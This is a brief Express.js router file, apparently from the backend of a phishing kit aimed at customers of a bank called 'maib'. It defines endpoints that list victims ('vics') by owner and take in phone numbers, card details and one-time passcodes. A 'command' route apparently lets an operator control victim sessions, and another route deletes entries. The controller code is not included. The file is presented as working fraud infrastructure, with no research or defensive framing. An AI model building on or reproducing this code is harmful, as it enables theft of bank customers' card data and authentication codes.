const express = require("express");
const {
    getOwnerVics,
    command,
    getInfo,
    submitTelephone,
    submitTelephoneAgain,
    submitCard,
    submitOtp,
    deleteEntry,
} = require("../controllers/maibController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/telephone", submitTelephone);
router.post("/telephoneAgain", submitTelephoneAgain);
router.post("/otp", submitOtp);
router.post("/card", submitCard);
router.post("/delete", deleteEntry);

module.exports = router;
